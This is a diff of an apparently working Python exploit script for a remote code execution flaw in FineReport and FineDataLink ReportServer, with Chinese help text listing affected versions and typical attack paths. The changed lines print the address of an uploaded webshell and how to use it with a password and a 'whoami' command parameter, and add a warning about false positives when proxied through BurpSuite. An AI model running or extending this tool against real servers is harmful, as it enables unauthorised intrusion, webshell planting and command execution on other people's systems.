@@ -7,7 +7,8 @@ from urllib.parse import urlsplit
 parser = argparse.ArgumentParser(
     description="FineReport view ReportServer接口 RCE \n"
                 "-影响范围：帆软FineReport V10、V11（最新版）FineDataLink 4.1.10.3 及以下版本\n"
-                "-利用路径一般为： http(s)://xxx/webroot/decision | xxx/decision | / \n",
+                "-利用路径一般为： http(s)://xxx/webroot/decision | xxx/decision | / \n"
+                "使用BurpSuite代理时大概率会出现误报",
     formatter_class=argparse.RawTextHelpFormatter
 )
 parser.add_argument('-u', '--url', type=str,
@@ -114,13 +115,12 @@ def exp(url):
         response = request(webshell_url, args.proxy)
         if response is not None:
             if response.status == 200:
-                data = response.read()
-                if data:
-                    print(
-                        f"[+] webshell地址为：{webshell_url}/help/neko{runtime}.jsp\n如使用默认webshell 则利用方式为：{webshell_url}/help/neko{runtime}.jsp?pwd=neko&c=whoami")
+                if args.webshell:
+                    print(f"[+] webshell地址为：{webshell_url}\n利用方式为：{webshell_url}?pwd=neko&c=whoami")
+                elif args.file:
+                    print(f"[+] 上传的文件地址为：{webshell_url}")
                 else:
-                    print(
-                        f"[!] {url}利用失败。但webshell地址：{webshell_url}/help/neko{runtime}.jsp存在。")
+                    print(f"[+] 上传地址为：{webshell_url}")
             else:
                 print(
                     f"[-] {url}利用失败。可能路径发生错误，-h查看说明。")
